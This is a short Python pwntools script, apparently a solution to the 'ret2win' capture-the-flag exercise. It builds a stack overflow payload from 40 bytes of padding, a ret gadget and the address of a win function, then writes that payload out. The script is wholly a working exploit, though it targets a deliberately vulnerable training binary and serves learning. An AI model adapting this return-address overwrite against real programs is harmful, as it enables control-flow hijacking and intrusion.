from pwn import *
import sys

def main():
    # elf = ELF(str("./ret2win"), checksec = False)
    # chall = process("./ret2win")
    # chall = gdb.debug("./ret2win")

    initialJunk = b"A"*40
    payload = p64(0x400756)
    ret2 = p64(0x00000000004006e7)
    sys.stdout.buffer.write(initialJunk + ret2 + payload)
    # chall.sendlineafter(b"> ", initialJunk+payload)
    # print(chall.recvuntil(b"flag\n", timeout = 1))
    # print(chall.recvline(timeout = 1))
    # chall.interactive()

if __name__ == "__main__":
    main()
